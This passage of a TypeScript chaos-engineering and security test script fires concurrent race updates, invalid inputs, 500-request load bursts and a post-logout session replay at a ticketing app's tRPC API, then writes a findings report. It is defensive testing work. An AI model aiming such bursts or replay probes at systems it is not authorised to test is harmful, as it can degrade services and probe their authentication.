      qry("tickets.get",    { id: dbTicketId }, ADMIN_SESSION),
      mut("tickets.update", { id: dbTicketId, title: "RACE_A" }, ADMIN_SESSION),
      mut("tickets.update", { id: dbTicketId, title: "RACE_B" }, ADMIN_SESSION),
      mut("tickets.update", { id: dbTicketId, title: "RACE_C" }, ADMIN_SESSION),
      mut("tickets.addComment", { ticketId: dbTicketId, content: "COMMENT_1" }, ADMIN_SESSION),
      mut("tickets.addComment", { ticketId: dbTicketId, content: "COMMENT_2" }, ADMIN_SESSION),
      qry("tickets.get",    { id: dbTicketId }, ADMIN_SESSION),
    ]);
    const ops500 = ops.filter(r => r.status >= 500).length;
    if (ops500 > 0) {
      find({ severity:"HIGH", category:"DATA_INTEGRITY",
        title:`${ops500}/7 concurrent mixed ops on same ticket return 500`,
        endpoint:"/trpc/tickets.*", payload:"concurrent get+3×update+2×comment",
        observed:`${ops500} server errors`, expected:"All succeed or conflict gracefully",
        hypothesis:"DB serialization error not caught; transaction isolation issue" });
    } else emit(`  ✓ Concurrent mixed ops: 0 errors`);

    // 8b. Invalid status transitions
    emit("  8b. Invalid state machine transitions…");
    const badTransitions = [
      { id: dbTicketId, status: "nonexistent_status" },
      { id: dbTicketId, status: "closed", resolution: null },
      { id: dbTicketId, resolvedAt: "not-a-date" },
    ];
    for (const data of badTransitions) {
      const r = await mut("tickets.update", data, ADMIN_SESSION);
      if (r.status === 500) {
        find({ severity:"MEDIUM", category:"DATA_INTEGRITY",
          title:"Invalid state transition value causes 500",
          endpoint:"/trpc/tickets.update", payload:JSON.stringify(data),
          observed:"HTTP 500", expected:"400 BAD_REQUEST",
          hypothesis:"Status/date fields not validated; invalid value reaches DB constraint" });
      }
    }
  }

  // 8c. FK integrity — reference non-existent entities
  emit("  8c. Orphaned foreign key references…");
  const fakeUUID = "00000000-0000-0000-0000-000000000001";
  const fkTests = [
    { title:"FK_ASSIGNEE",  assigneeId: fakeUUID },
    { title:"FK_TEAM",      teamId:     fakeUUID },
    { title:"FK_PROJECT",   projectId:  fakeUUID },
  ];
  for (const extra of fkTests) {
    const r = await mut("tickets.create",
      { description: "fk test", priority: "4_low", type: "incident", ...extra },
      ADMIN_SESSION);
    if (r.status === 500) {
      find({ severity:"MEDIUM", category:"DATA_INTEGRITY",
        title:`FK violation causes 500: ${Object.keys(extra).find(k=>k!=='title')}=non-existent`,
        endpoint:"/trpc/tickets.create", payload:JSON.stringify(extra),
        observed:"HTTP 500 — FK constraint error", expected:"400 BAD_REQUEST",
        hypothesis:"FK constraint violation bubbles as unhandled 500 rather than user-facing validation error" });
    }
  }

  // 8d. Concurrent create + immediate delete race
  emit("  8d. Create-delete-read race condition…");
  const phantom = await mut("tickets.create",
    { title:`PHANTOM_${Date.now()}`, description:"phantom", priority:"4_low", type:"incident" },
    ADMIN_SESSION);
  const phantomId = (parseData(phantom.body) as {id?:string}|null)?.id;
  if (phantomId) {
    const raceOps = await Promise.all([
      qry("tickets.get", { id: phantomId }, ADMIN_SESSION),
      // Some systems have tickets.delete or tickets.close
      mut("tickets.update", { id: phantomId, status: "cancelled" }, ADMIN_SESSION),
      qry("tickets.get", { id: phantomId }, ADMIN_SESSION),
      mut("tickets.update", { id: phantomId, status: "cancelled" }, ADMIN_SESSION),
    ]);
    const race500 = raceOps.filter(r => r.status >= 500).length;
    if (race500 > 0) {
      find({ severity:"MEDIUM", category:"DATA_INTEGRITY",
        title:`${race500}/4 phantom read/cancel race ops return 500`,
        endpoint:"/trpc/tickets.*", payload:"create+cancel+read race",
        observed:`${race500} errors`, expected:"0 errors",
        hypothesis:"Phantom read: ticket status update race without row locking" });
    } else emit(`  ✓ Phantom race: 0 errors`);
  }
}

// ─── PHASE 9: WORKFLOW & CROSS-SYSTEM ATTACKS ────────────────────────────────
async function phase9_workflow(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 9: WORKFLOW & CROSS-SYSTEM ATTACKS");
  emit("══════════════════════════════════════════");

  // 9a. Workflow enumeration and concurrent triggers
  emit("  9a. Workflow list + concurrent trigger…");
  const wfList = await qry("workflows.list", {}, ADMIN_SESSION);
  emit(`  Workflows list: HTTP ${wfList.status}`);
  const workflows = ((parseData(wfList.body) as {items?:{id:string}[]}|null)?.items ?? []);
  emit(`  Workflows found: ${workflows.length}`);

  // 9b. Approval self-approval bypass
  emit("  9b. Approval workflow manipulation…");
  const pendR = await qry("approvals.myPending", {}, ADMIN_SESSION);
  emit(`  My pending approvals: HTTP ${pendR.status}`);

  // 9c. Notification spam
  emit("  9c. Notification storm (50× simultaneous notifications read)…");
  const notifs = await Promise.all(
    Array.from({length:50}, () => qry("notifications.list", { limit: 50 }, ADMIN_SESSION))
  );
  const n500 = notifs.filter(r => r.status >= 500).length;
  if (n500 > 0) {
    find({ severity:"MEDIUM", category:"STABILITY",
      title:`${n500}/50 concurrent notifications.list return 500`,
      endpoint:"/trpc/notifications.list", payload:"50× concurrent",
      observed:`${n500} errors`, expected:"All 200",
      hypothesis:"Notification query not index-optimized; concurrent reads cause lock contention" });
  }

  // 9d. Missing routes (cross-layer failure mapping)
  emit("  9d. Probing all module procedures (RBAC gaps)…");
  const moduleProbes: [string, Record<string,unknown>][] = [
    ["surveys.create",       { title:"RBAC_TEST", description:"test" }],
    ["events.list",          {}],
    ["oncall.schedules.list",{}],
    ["walkup.requests.list", {}],
    ["grc.list",             {}],
    ["legal.contracts.list", {}],
    ["crm.accounts.list",    {}],
  ];
  for (const [proc, input] of moduleProbes) {
    const r = await qry(proc, input, ADMIN_SESSION);
    if (r.status >= 500) {
      find({ severity:"HIGH", category:"STABILITY",
        title:`Module procedure returns 500 with valid admin session: ${proc}`,
        endpoint:`/trpc/${proc}`, payload:JSON.stringify(input),
        observed:`HTTP ${r.status}: ${r.body.slice(0,100)}`,
        expected:"200 or 403 FORBIDDEN",
        hypothesis:"Drizzle schema import error (Symbol(drizzle:Columns)) or missing operator; crashes handler" });
    } else {
      emit(`  ${proc}: ${r.status}`);
    }
  }
}

// ─── PHASE 10: ADAPTIVE ESCALATION ───────────────────────────────────────────
async function phase10_escalation(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 10: ADAPTIVE ESCALATION");
  emit("══════════════════════════════════════════");

  const critCount = findings.filter(f => f.severity === "CRITICAL").length;
  const highCount = findings.filter(f => f.severity === "HIGH").length;
  emit(`  Current findings: ${critCount} CRITICAL, ${highCount} HIGH`);
  emit("  Escalating: 500-concurrent burst + replay attacks…");

  // Final 500-concurrent burst
  const burst500 = await Promise.all(
    Array.from({length:500}, (_, i) =>
      qry("tickets.list", { limit: 25, offset: (i % 20) * 25 }, ADMIN_SESSION))
  );
  const b200 = burst500.filter(r => r.status === 200).length;
  const b429 = burst500.filter(r => r.status === 429).length;
  const b503 = burst500.filter(r => r.status === 503).length;
  const b500 = burst500.filter(r => r.status === 500).length;
  const b0   = burst500.filter(r => r.status === 0).length;
  const blat = burst500.map(r => r.ms);
  emit(`  500× tickets.list: ${b200} ok | ${b429} rl | ${b503} ov | ${b500} err | ${b0} fail`);
  emit(`  p50=${pct(blat,0.5)}ms p95=${pct(blat,0.95)}ms p99=${pct(blat,0.99)}ms max=${Math.max(...blat)}ms`);

  if (b500 > 0) {
    find({ severity:"HIGH", category:"STABILITY",
      title:`${b500}/500 list requests return 500 under sustained 500-concurrent burst`,
      endpoint:"/trpc/tickets.list", payload:"500× concurrent paginated list",
      observed:`${b500} server errors`, expected:"200/429/503 — never 500",
      hypothesis:"DB connection pool exhausted; unhandled pool-error surface in query handler" });
  }
  if (b0 > 25) {
    find({ severity:"HIGH", category:"STABILITY",
      title:`${b0}/500 requests fail at network level under 500-concurrent burst`,
      endpoint:"/trpc/tickets.list", payload:"500× concurrent",
      observed:`${b0} TCP connection failures`, expected:"<5% failure rate",
      hypothesis:"OS TCP backlog or Fastify connection queue limit hit; requests dropped before reaching app" });
  }

  // Replay attack: reuse old session token after logout
  emit("  Replay attack: use session after logout…");
  const tmpR = await mut("auth.login", { email: ADMIN_EMAIL, password: ADMIN_PASSWORD });
  if (tmpR.status === 200) {
    const tmpSess = (parseData(tmpR.body) as {sessionId?:string}|null)?.sessionId ?? "";
    const loR     = await mut("auth.logout", {}, tmpSess);
    emit(`  Logout: HTTP ${loR.status}`);
    const replayR = await qry("auth.me", {}, tmpSess);
    emit(`  Post-logout me: HTTP ${replayR.status}`);
    if (replayR.status === 200 && isAuthMeAuthenticated(replayR.body)) {
      find({ severity:"CRITICAL", category:"AUTH",
        title:"Session replay: token accepted after logout",
        endpoint:"/trpc/auth.me", payload:"Bearer from logged-out session",
        observed:"HTTP 200 — still authenticated after logout",
        expected:"401 UNAUTHORIZED",
        hypothesis:"Session not invalidated in Redis on logout; token remains valid until natural TTL expiry" });
    } else {
      emit("  ✓ Replay attack: session correctly invalidated after logout");
    }
  }

  // Final health check
  emit("\n  POST-CHAOS HEALTH CHECK…");
  const hR = await httpGet(`${API}/internal/health`);
  emit(`  Health: HTTP ${hR.status}`);
  try {
    const h = JSON.parse(hR.body);
    emit(`  Status: ${h.status}`);
    emit(`  In-flight: ${JSON.stringify(h.concurrency)}`);
    emit(`  Error rate: ${h.summary?.error_rate}`);
    emit(`  p99 latency: ${h.summary?.p99_ms}ms`);
    if (h.status === "UNHEALTHY" || h.status === "DEGRADED") {
      find({ severity:"HIGH", category:"STABILITY",
        title:`System health degraded post-chaos: ${h.status}`,
        endpoint:"/internal/health", payload:"GET",
        observed:`status=${h.status}, reasons=${JSON.stringify(h.reasons)}`,
        expected:"HEALTHY after test completes",
        hypothesis:"Active health monitor detects error spike or latency regression from chaos load" });
    }
  } catch { emit("  ⚠ Could not parse health response"); }
}

// ─── REPORT GENERATION ────────────────────────────────────────────────────────
function generateReport(): string {
  const bySev: Record<string, Finding[]> = {
    CRITICAL: findings.filter(f=>f.severity==="CRITICAL"),
    HIGH:     findings.filter(f=>f.severity==="HIGH"),
    MEDIUM:   findings.filter(f=>f.severity==="MEDIUM"),
    LOW:      findings.filter(f=>f.severity==="LOW"),
    INFO:     findings.filter(f=>f.severity==="INFO"),
  };

  const lines: string[] = [];
  lines.push("# STRESS_TEST_CRITICAL_FAILURES.md");
  lines.push("");
  lines.push(`**Generated:** ${new Date().toISOString()}`);
  lines.push(`**Target:** \`${BASE}\` (Frontend) + \`${API}\` (API)`);
  lines.push(`**Agent:** Autonomous Chaos Engineering Agent v2 — Principal Software Resilience Architect`);
  lines.push(`**Test Scope:** Auth bypass, IDOR, input validation, concurrency/race, DB integrity, workflow attacks, API destruction`);
  lines.push("");
  lines.push("---");
  lines.push("");
  lines.push("## Executive Summary");
  lines.push("");
  lines.push("| Severity | Count | Description |");
  lines.push("|---|---|---|");
  lines.push(`| 🔴 CRITICAL | ${bySev.CRITICAL.length} | System crashes, auth bypass, data corruption |`);
  lines.push(`| 🟠 HIGH     | ${bySev.HIGH.length} | Major instability, workflow failure, injection |`);
  lines.push(`| 🟡 MEDIUM   | ${bySev.MEDIUM.length} | Recoverable issues, validation gaps |`);
  lines.push(`| 🔵 LOW      | ${bySev.LOW.length} | Minor issues |`);
  lines.push(`| **TOTAL**   | **${findings.length}** | |`);
  lines.push("");

  const sevIcons: Record<string, string> = {
    CRITICAL: "🔴", HIGH: "🟠", MEDIUM: "🟡", LOW: "🔵", INFO: "ℹ️"
  };
  let findingNum = 0;
  for (const [sev, list] of Object.entries(bySev)) {
    if (list.length === 0) continue;
    lines.push(`---`);
    lines.push("");
    lines.push(`## ${sevIcons[sev]} ${sev} (${list.length} findings)`);
    lines.push("");
    for (const f of list) {
      findingNum++;
      lines.push(`### ${sevIcons[sev]} F-${String(findingNum).padStart(3,"0")}: ${f.title}`);
      lines.push("");
      lines.push(`- **Severity:** ${f.severity}`);
      lines.push(`- **Category:** ${f.category}`);
      lines.push(`- **Endpoint/Feature:** \`${f.endpoint}\``);
      lines.push(`- **Payload Used:** \`${f.payload.slice(0,150)}\``);
      lines.push(`- **Observed Behavior:** ${f.observed}`);
      lines.push(`- **Expected Behavior:** ${f.expected}`);
      lines.push(`- **Root Cause Hypothesis:** ${f.hypothesis}`);
      if (f.reproSteps) {
        lines.push(`- **Reproduction Steps:**`);
        lines.push(`  \`\`\``);
        f.reproSteps.split("\n").forEach(s => lines.push(`  ${s}`));
        lines.push(`  \`\`\``);
      }
      lines.push("");
    }
  }

  lines.push("---");
  lines.push("");
  lines.push("## Live Execution Log (last 60 lines)");
  lines.push("```");
  logLines.slice(-60).forEach(l => lines.push(l));
  lines.push("```");

  return lines.join("\n");
}

// ─── MAIN ─────────────────────────────────────────────────────────────────────
async function main() {
  emit("╔═══════════════════════════════════════════════════╗");
  emit("║   NEXUSOPS AUTONOMOUS CHAOS ENGINEERING AGENT v2   ║");
  emit("║   Principal Software Resilience Architect Mode     ║");
  emit(`║   Target: ${BASE}                        ║`);
  emit("╚═══════════════════════════════════════════════════╝");
  emit(`  Node.js ${process.version}`);

  const ok = await phase1_auth();
  if (!ok) { emit("ABORT: Cannot authenticate — cannot proceed with destructive tests"); process.exit(1); }

  await phase2_unauth();
  await phase3_auth_bypass();
  await phase4_idor();
  await phase5_input();
  await phase6_concurrency();
  await phase7_api_destruction();
  await phase8_db_integrity();
  await phase9_workflow();
  await phase10_escalation();

  emit("\n══════════════════════════════════════════");
  emit("  CHAOS COMPLETE — GENERATING REPORT");
  emit("══════════════════════════════════════════");

  const { writeFileSync, mkdirSync } = await import("fs");
  mkdirSync("results", { recursive: true });

  const report = generateReport();
  writeFileSync("results/STRESS_TEST_CRITICAL_FAILURES.md",   report);
  writeFileSync("results/STRESS_TEST_CRITICAL_FAILURES.json",
    JSON.stringify({ findings, summary: {
      critical: findings.filter(f=>f.severity==="CRITICAL").length,
      high:     findings.filter(f=>f.severity==="HIGH").length,
      medium:   findings.filter(f=>f.severity==="MEDIUM").length,
      low:      findings.filter(f=>f.severity==="LOW").length,
      total:    findings.length,
    }}, null, 2));

  emit(`\n  FINDINGS SUMMARY:`);
  emit(`    🔴 CRITICAL: ${findings.filter(f=>f.severity==="CRITICAL").length}`);
  emit(`    🟠 HIGH:     ${findings.filter(f=>f.severity==="HIGH").length}`);
  emit(`    🟡 MEDIUM:   ${findings.filter(f=>f.severity==="MEDIUM").length}`);
  emit(`    🔵 LOW:      ${findings.filter(f=>f.severity==="LOW").length}`);
  emit(`    TOTAL:       ${findings.length}`);
  emit("\n  Reports: results/STRESS_TEST_CRITICAL_FAILURES.{md,json}");
}

main().catch(e => { console.error("AGENT FATAL:", e); process.exit(1); });
